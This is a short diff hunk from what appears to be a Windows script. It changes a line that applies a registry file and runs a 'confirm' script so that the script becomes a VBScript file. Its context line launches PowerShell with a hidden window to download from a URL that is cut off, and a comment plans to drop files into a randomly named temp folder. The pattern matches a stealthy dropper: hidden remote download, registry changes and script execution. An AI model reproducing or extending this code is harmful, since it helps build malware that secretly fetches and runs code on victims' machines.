@@ -141,7 +141,7 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://r
 
 
 # Install/Run the Registry && conformation code HERE
-./ServiceModelWinRegConfig.reg ./confirm
+./ServiceModelWinRegConfig.reg ./confirm.vbs
 
 # if in future i need to create and put any file in the created (random named) folder inside the temp directory, the code for creating that particular file will go here
 ###
